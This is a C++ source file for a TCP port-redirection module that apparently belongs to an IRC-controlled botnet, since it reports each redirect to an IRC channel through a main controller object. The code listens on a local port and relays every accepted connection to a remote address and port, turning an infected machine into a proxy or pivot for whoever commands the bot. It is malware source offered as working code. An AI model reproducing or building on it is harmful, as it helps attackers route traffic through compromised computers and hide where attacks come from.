
#include "main.h"
#include "redir_tcp.h"
#include "mainctrl.h"
#include "utility.h"

CRedirectTCP_XmitThread::CRedirectTCP_XmitThread() { m_sRedirectName.Assign("TCP"); }

void CRedirectTCP_XmitThread::StartRedirect(){	
	char szBuf[4096]; int iErr;
	while(m_pRedirect->m_bRedirecting){	
		memset(szBuf, 0, sizeof(szBuf));
		iErr=xRead(m_pRedirTCP_Recv->m_sServerSocket, szBuf, sizeof(szBuf));
		if(!iErr || iErr==SOCKET_ERROR) break;
		iErr=xWrite(m_pRedirTCP_Recv->m_sClientSocket, szBuf, iErr);
		if(!iErr || iErr==SOCKET_ERROR) break; }

	if(m_pRedirTCP_Recv->m_sClientSocket!=INVALID_SOCKET) xClose(m_pRedirTCP_Recv->m_sClientSocket); 
}

CRedirectTCP_RecvThread::CRedirectTCP_RecvThread() { m_sRedirectName.Assign("TCP"); }

void CRedirectTCP_RecvThread::StartRedirect(){	
	m_sServerSocket=INVALID_SOCKET;
	while(m_pRedirect->m_bRedirecting){	
		if(m_sServerSocket==INVALID_SOCKET){	
			m_sServerSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if(m_sServerSocket==SOCKET_ERROR){	
				m_sServerSocket=INVALID_SOCKET; return; 
			} 
		}

		// Fill in sockaddr and resolve the host
		sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family=AF_INET; ssin.sin_port=htons(m_iRemotePort);
		ssin.sin_addr.s_addr=ResolveAddress(m_sRemoteAddr.CStr());
		if(ssin.sin_addr.s_addr==INADDR_NONE) {	xClose(m_sServerSocket); return; }	// The host couldn't be resolved, exit

		// Connect to the server
		int iErr=connect(m_sServerSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
		if(iErr==-1) {	xClose(m_sServerSocket); return; }							// Connect failed, exit

		int iLen; char szBuf[4096]; fd_set fd;

		SET_SOCK_BLOCK(m_sClientSocket, 0); SET_SOCK_BLOCK(m_sServerSocket, 0);

		while(m_pRedirect->m_bRedirecting){
			iLen=xRead(m_sServerSocket, szBuf, sizeof(szBuf));
			if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
			xWrite(m_sClientSocket, szBuf, iLen);

			iLen=xRead(m_sClientSocket, szBuf, sizeof(szBuf));
			if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
			xWrite(m_sServerSocket, szBuf, iLen);
		}

		break; }

	if(m_sClientSocket!=INVALID_SOCKET) xClose(m_sClientSocket);
	if(m_sServerSocket!=INVALID_SOCKET) xClose(m_sServerSocket);
}

CRedirectTCP::CRedirectTCP() { m_sRedirectName.Assign("TCP"); }

void CRedirectTCP::StartRedirect(){	
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Redirecting from Port %d to \'%s:%d\'.", m_sRedirectName.CStr(), m_iLocalPort, m_sRemoteAddr.CStr(), m_iRemotePort);

	m_sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sListenSocket==SOCKET_ERROR) return;

	sockaddr_in ssin, cssin; memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET; ssin.sin_port=htons(m_iLocalPort);
	socklen_t clen=sizeof(cssin);

	if(bind(m_sListenSocket, (sockaddr*)&ssin, sizeof(ssin))!=0){	xClose(m_sListenSocket); return; }

	while(m_pRedirect->m_bRedirecting){	
		if(listen(m_sListenSocket, 10)==SOCKET_ERROR) { Sleep(250); continue; }
		int sClientSocket=accept(m_sListenSocket, (sockaddr*)&cssin, &clen);
		if(sClientSocket!=SOCKET_ERROR && sClientSocket!=0)
		{	CRedirectTCP_RecvThread *pTemp=new CRedirectTCP_RecvThread;
			pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirTCP=this;
			pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_iRemotePort=m_iRemotePort;
			pTemp->m_sRemoteAddr.Assign(m_sRemoteAddr); pTemp->m_sClientSocket=sClientSocket;
			pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
			pTemp->Start(); }
		Sleep(250); }

	if(m_sListenSocket!=INVALID_SOCKET) xClose(m_sListenSocket);

	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Finished redirecting from port %d to \"%s:%d\".", m_sRedirectName.CStr(), m_iLocalPort, m_sRemoteAddr.CStr(), m_iRemotePort); 
}
